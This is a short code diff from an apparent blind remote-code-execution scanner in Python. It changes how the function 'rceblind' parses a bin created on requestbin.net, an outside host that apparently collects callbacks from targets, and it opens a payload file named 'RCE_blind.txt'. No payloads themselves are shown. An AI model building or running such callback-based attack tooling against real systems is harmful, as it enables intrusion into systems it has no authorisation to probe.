@@ -194,8 +194,8 @@ def V():
 def I():
 	def rceblind(site, pog, params):
 		if pog == "p":
-			request = requests.post("http://requestbin.net/api/v1/bins", data={"private": "false"}).text.split("{\"request_count\": 0, \"name\": \"")[1]
-			requestbin = "http://requestbin.net/r/" + request.split("\", \"color\": [")[0]
+			request = requests.post("http://requestbin.net/api/v1/bins", data={"private": "false"}).text.split("\"request_count\": 0, \"name\": \"")[1]
+			requestbin = "http://requestbin.net/r/" + request.split("\", \"private\": false}")[0]
 			try:
 				f = open("RCE_blind.txt", "r")
 			except FileNotFoundError:
